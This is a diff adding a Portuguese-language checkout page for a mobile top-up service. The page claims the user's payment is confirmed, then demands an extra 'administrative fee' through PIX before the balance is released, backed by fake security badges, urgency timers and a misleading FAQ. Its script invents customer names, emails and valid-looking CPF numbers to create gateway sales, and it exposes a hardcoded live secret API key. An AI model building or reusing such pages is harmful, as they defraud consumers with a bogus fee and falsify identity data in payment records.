@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Taxa Administrativa — PréPago Fácil</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Poppins:wght@600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <style>
+        :root {
+            --blue-primary: #1E40AF;
+            --blue-secondary: #2563EB;
+            --bg-top: #EAF2FF;
+            --bg-middle: #F5F9FF;
+            --bg-bottom: #FFFFFF;
+            --text-primary: #0F172A;
+            --text-secondary: #64748B;
+            --border: #DCE7F7;
+            --card-bg: rgba(255, 255, 255, .98);
+            --success: #16A34A;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(180deg, var(--bg-top) 0%, var(--bg-middle) 45%, var(--bg-bottom) 100%);
+            color: var(--text-primary);
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 32px;
+            padding: 30px;
+            box-shadow: 0 25px 50px rgba(15, 23, 42, .1);
+            text-align: center;
+            margin-top: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Top Bar Branding */
+        .top-bar {
+            width: 100%;
+            max-width: 450px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 25px;
+            background: var(--card-bg);
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(15, 23, 42, .05);
+            margin-bottom: 5px;
+            border: 1px solid var(--border);
+        }
+
+        .logo-area { display: flex; align-items: center; gap: 12px; }
+        .logo-icon {
+            width: 38px; height: 38px;
+            background: var(--blue-primary);
+            color: white;
+            border-radius: 10px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 18px;
+        }
+        .logo-text { display: flex; flex-direction: column; text-align: left; }
+        .logo-text strong { font-family: 'Poppins', sans-serif; font-size: 15px; color: var(--blue-primary); line-height: 1.1; }
+        .logo-text span { font-size: 11px; color: var(--text-secondary); }
+        
+        .secure-badge {
+            background: #DCFCE7; color: var(--success);
+            padding: 6px 12px; border-radius: 50px;
+            font-size: 11px; font-weight: 700;
+            display: flex; align-items: center; gap: 5px;
+        }
+
+        /* Progress steps */
+        .progress-bar {
+            display: flex; justify-content: space-between;
+            margin-bottom: 25px; padding: 0 10px;
+        }
+        .step {
+            font-size: 12px; font-weight: 600; color: var(--text-secondary);
+            display: flex; align-items: center; gap: 5px;
+        }
+        .step.active { color: var(--blue-primary); }
+        .step.completed { color: var(--success); }
+        .progress-line { flex: 1; height: 2px; background: var(--border); margin: 0 10px; position: relative; top: 8px; }
+        .progress-line::after { content: ''; position: absolute; left: 0; top: 0; height: 100%; width: 50%; background: var(--success); }
+
+        .header {
+            background: var(--blue-primary);
+            color: white;
+            border-radius: 18px;
+            padding: 20px;
+            margin-bottom: 25px;
+            box-shadow: 0 10px 20px rgba(30, 64, 175, .2);
+        }
+
+        h1 { font-family: 'Poppins', sans-serif; font-size: 20px; color: white; margin-bottom: 5px; }
+        .header p { font-size: 14px; opacity: 0.9; }
+        
+        .timer-box { font-weight: 700; color: #DC2626; margin-bottom: 20px; font-size: 14px; background: #FEF2F2; padding: 10px; border-radius: 99px; display: inline-block; }
+
+        .explanation {
+            background: #FEFCE8;
+            border: 1px solid #FEF08A;
+            color: #854D0E;
+            padding: 15px;
+            border-radius: 12px;
+            font-size: 0.85rem;
+            line-height: 1.5;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        /* Summary Box */
+        .summary-box {
+            background: #F8FAFC;
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 15px;
+            margin-bottom: 25px;
+            text-align: left;
+        }
+        .summary-row {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 8px 0; border-bottom: 1px dashed var(--border);
+            font-size: 0.9rem;
+        }
+        .summary-row:last-child { border-bottom: none; padding-bottom: 0; }
+        .summary-row span:first-child { color: var(--text-secondary); }
+
+        .price-tag {
+            font-family: 'Poppins', sans-serif;
+            font-size: 2.5rem;
+            color: var(--blue-primary);
+            display: block;
+            margin-bottom: 25px;
+        }
+
+        .btn-primary {
+            width: 100%;
+            border: none;
+            border-radius: 18px;
+            padding: 16px;
+            background: var(--blue-primary);
+            color: #fff;
+            font-weight: 700;
+            font-size: 1.1rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: .2s;
+            margin-bottom: 25px;
+            box-shadow: 0 4px 15px rgba(37, 99, 235, 0.3);
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            background: var(--blue-secondary);
+        }
+
+        .btn-primary:disabled {
+            background: var(--text-secondary);
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        /* FAQ Section */
+        .faq-section {
+            background: #F1F5F9;
+            border-radius: 16px;
+            padding: 15px;
+            text-align: left;
+            margin-bottom: 20px;
+        }
+        .faq-section h3 {
+            font-size: 0.9rem; color: var(--text-primary); margin-bottom: 8px; display: flex; align-items: center; gap: 8px;
+        }
+        .faq-section h3 i { color: var(--blue-secondary); }
+        .faq-section p { font-size: 0.8rem; color: var(--text-secondary); line-height: 1.5; }
+
+        .security-footer {
+            border-top: 1px solid var(--border);
+            padding-top: 15px;
+            color: var(--success);
+            font-size: 0.8rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .qr-placeholder {
+            width: 220px;
+            height: 220px;
+            margin: 0 auto 25px;
+            background: #fff;
+            border: 2px solid var(--border);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            padding: 15px;
+        }
+        .qr-placeholder canvas, .qr-placeholder img { width: 100% !important; height: 100% !important; }
+
+        .pix-code-box {
+            background: #F1F5F9;
+            border-radius: 16px;
+            padding: 15px;
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        .pix-code-title {
+            font-size: 0.75rem;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .pix-code-text {
+            font-family: monospace;
+            font-size: 11px;
+            word-break: break-all;
+            color: var(--text-secondary);
+            max-height: 60px;
+            overflow: hidden;
+            display: -webkit-box;
+            -webkit-line-clamp: 3;
+            -webkit-box-orient: vertical;
+            margin-bottom: 15px;
+        }
+
+        #pixArea { display: none; }
+        
+        /* Spinner */
+        .loader {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid #fff;
+            width: 24px;
+            height: 24px;
+            -webkit-animation: spin 1s linear infinite;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Error modal */
+        #errorModal {
+            display: none; position: fixed; inset: 0; background: rgba(15,23,42,.8);
+            backdrop-filter: blur(4px); z-index: 50; align-items: center; justify-content: center;
+        }
+        .error-content {
+            background: #fff; padding: 30px; border-radius: 24px; text-align: center; max-width: 320px; width: 90%;
+        }
+        .error-icon { color: #ef4444; font-size: 40px; margin-bottom: 15px; }
+        .error-close { background: #f1f5f9; color: #475569; border: none; padding: 10px 20px; border-radius: 12px; font-weight: 600; cursor: pointer; margin-top: 15px; width: 100%; }
+    </style>
+</head>
+<body>
+
+    <div class="top-bar">
+        <div class="logo-area">
+            <div class="logo-icon"><i class="fa-solid fa-mobile-screen"></i></div>
+            <div class="logo-text">
+                <strong>RECARGA FÁCIL</strong>
+                <span>Checkout Oficial</span>
+            </div>
+        </div>
+        <div class="secure-badge">
+            <i class="fa-solid fa-lock"></i> Ambiente Seguro
+        </div>
+    </div>
+
+    <div class="container">
+        
+        <div class="progress-bar">
+            <div class="step completed"><i class="fa-solid fa-check-circle"></i> Recarga</div>
+            <div class="progress-line"></div>
+            <div class="step active"><i class="fa-solid fa-circle-dot"></i> Liberação</div>
+        </div>
+
+        <div class="header">
+            <h1>Taxa Administrativa</h1>
+            <p>Último passo para concluir sua recarga.</p>
+        </div>
+
+        <div class="explanation">
+            <strong>Atenção:</strong> Seu pagamento inicial foi confirmado! No entanto, para a liberação final do saldo na operadora, é necessário o recolhimento da <strong>Taxa Administrativa</strong> padrão de conectividade.
+        </div>
+
+        <div class="summary-box">
+            <div class="summary-row">
+                <span>Status da Recarga:</span>
+                <span style="color: var(--success); font-weight: 700;"><i class="fa-solid fa-clock-rotate-left"></i> Aguardando Liberação</span>
+            </div>
+            <div class="summary-row">
+                <span>Valor da Taxa:</span>
+                <strong>R$ 12,39</strong>
+            </div>
+        </div>
+
+        <span class="price-tag">R$ 12,39</span>
+
+        <div id="generateArea">
+            <button id="btnGenerate" class="btn-primary">
+                <span class="btn-text">Gerar Pagamento da Taxa</span>
+                <div class="loader"></div>
+            </button>
+        </div>
+
+        <div id="pixArea">
+            <div class="timer-box">
+                <i class="fa-regular fa-clock"></i> Expira em <span id="time">15:00</span>
+            </div>
+            
+            <p style="font-weight: 600; margin-bottom: 15px; color: var(--blue-primary);">Escaneie o código PIX abaixo</p>
+            
+            <div class="qr-placeholder">
+                <div id="qrcode"></div>
+            </div>
+
+            <div class="pix-code-box">
+                <div class="pix-code-title">OU COPIE O CÓDIGO</div>
+                <div class="pix-code-text" id="pixCode">...</div>
+            </div>
+
+            <button id="btnCopy" class="btn-primary">
+                <i class="fa-regular fa-copy"></i>
+                COPIAR CÓDIGO PIX
+            </button>
+        </div>
+
+        <div class="faq-section">
+            <h3><i class="fa-solid fa-circle-question"></i> Por que preciso pagar essa taxa?</h3>
+            <p>Essa é uma tarifa única de conectividade exigida para registrar o comprovante digital da sua recarga na rede da operadora. O seu saldo original já está garantido e será liberado automaticamente após a confirmação desta taxa.</p>
+        </div>
+        
+        <div class="security-footer">
+            <i class="fa-solid fa-shield-halved"></i> Pagamento 100% seguro e criptografado
+        </div>
+
+    </div>
+
+    <!-- Error Modal -->
+    <div id="errorModal">
+        <div class="error-content">
+            <div class="error-icon"><i class="fa-solid fa-circle-exclamation"></i></div>
+            <h3 style="margin-bottom: 10px;">Atenção</h3>
+            <p id="errorText" style="color: #64748b; font-size: 14px;">Erro ao gerar pix.</p>
+            <button class="error-close" onclick="document.getElementById('errorModal').style.display='none'">Fechar</button>
+        </div>
+    </div>
+
+    <script>
+        function showError(msg) {
+            document.getElementById('errorText').textContent = msg;
+            document.getElementById('errorModal').style.display = 'flex';
+        }
+
+        // Timer
+        function startTimer(duration, display) {
+            let timer = duration, minutes, seconds;
+            setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                display.textContent = minutes + ":" + seconds;
+                if (--timer < 0) timer = 0;
+            }, 1000);
+        }
+
+        function generateCPF() {
+            const r = () => Math.floor(Math.random() * 9);
+            const n = Array.from({length: 9}, r);
+            const calc = (n, m) => {
+                const s = n.reduce((acc, curr, i) => acc + curr * (m - i), 0);
+                const v = 11 - (s % 11);
+                return v >= 10 ? 0 : v;
+            };
+            n.push(calc(n, 10));
+            n.push(calc(n, 11));
+            return n.join('');
+        }
+
+        const firstNames = ['Marcos', 'Lucas', 'Ana', 'Julia', 'Roberto', 'Camila', 'Tiago', 'Bruna', 'Felipe', 'Mariana', 'Ricardo', 'Beatriz', 'Guilherme', 'Vanessa', 'Leandro'];
+        const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira', 'Lima', 'Gomes', 'Costa', 'Ribeiro', 'Martins', 'Carvalho', 'Almeida'];
+
+        function generateName() {
+            return firstNames[Math.floor(Math.random() * firstNames.length)] + " " + lastNames[Math.floor(Math.random() * lastNames.length)];
+        }
+
+        document.getElementById('btnGenerate').addEventListener('click', async () => {
+            const btn = document.getElementById('btnGenerate');
+            const btnText = btn.querySelector('.btn-text');
+            const loader = btn.querySelector('.loader');
+
+            btn.disabled = true;
+            btnText.style.display = 'none';
+            loader.style.display = 'block';
+
+            const phone = sessionStorage.getItem('checkout_phone') || '11999999999';
+
+            // Use the same name generator logic
+            const name = generateName();
+            const email = name.toLowerCase().replace(/\s+/g, '') + Math.floor(Math.random()*999) + "@gmail.com";
+            const cpf = generateCPF();
+
+            const blackcatPayload = {
+                amount: 1239, // R$ 12,39
+                currency: "BRL",
+                paymentMethod: "pix",
+                items: [{ title: "eboos", quantity: 1, unitPrice: 1239, tangible: false }],
+                customer: {
+                    name: name,
+                    email: email,
+                    phone: phone.replace(/\D/g, ''),
+                    document: { number: cpf, type: "cpf" }
+                },
+                pix: { expiresInDays: 1 }
+            };
+
+            try {
+                const response = await fetch("https://api.blackcatpay.com.br/api/sales/create-sale", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "X-API-Key": "sk_live_e83eb7792e98d74ecd8fbe18d5f816fc031f0a5acb1278e0a0e0b682fa10f0c3"
+                    },
+                    body: JSON.stringify(blackcatPayload)
+                });
+
+                const raw = await response.json();
+
+                if (raw.success) {
+                    const pixCode = raw.data.paymentData.qrCode || raw.data.paymentData.copyPaste;
+                    
+                    document.getElementById('generateArea').style.display = 'none';
+                    document.getElementById('pixArea').style.display = 'block';
+                    document.getElementById('pixCode').textContent = pixCode;
+
+                    new QRCode(document.getElementById("qrcode"), {
+                        text: pixCode,
+                        width: 190,
+                        height: 190,
+                        colorDark : "#000000",
+                        colorLight : "#ffffff",
+                        correctLevel : QRCode.CorrectLevel.M
+                    });
+
+                    startTimer(15 * 60, document.getElementById('time'));
+                } else {
+                    showError(raw.message || raw.error || 'Erro ao gerar pagamento da taxa');
+                    btn.disabled = false;
+                    btnText.style.display = 'block';
+                    loader.style.display = 'none';
+                }
+            } catch (err) {
+                showError('Erro de conexão com o gateway');
+                btn.disabled = false;
+                btnText.style.display = 'block';
+                loader.style.display = 'none';
+            }
+        });
+
+        document.getElementById('btnCopy').addEventListener('click', () => {
+            const code = document.getElementById('pixCode').textContent;
+            navigator.clipboard.writeText(code).then(() => {
+                const btn = document.getElementById('btnCopy');
+                const originalHtml = btn.innerHTML;
+                btn.innerHTML = '<i class="fa-solid fa-check"></i> COPIADO!';
+                btn.style.background = 'var(--success)';
+                setTimeout(() => {
+                    btn.innerHTML = originalHtml;
+                    btn.style.background = 'var(--blue-primary)';
+                }, 2000);
+            });
+        });
+
+        // Console shortcut kept for testing, but button removed
+        window.liberar = function() {
+            window.location.href = 'sucesso.html';
+        };
+    </script>
+</body>
+</html>
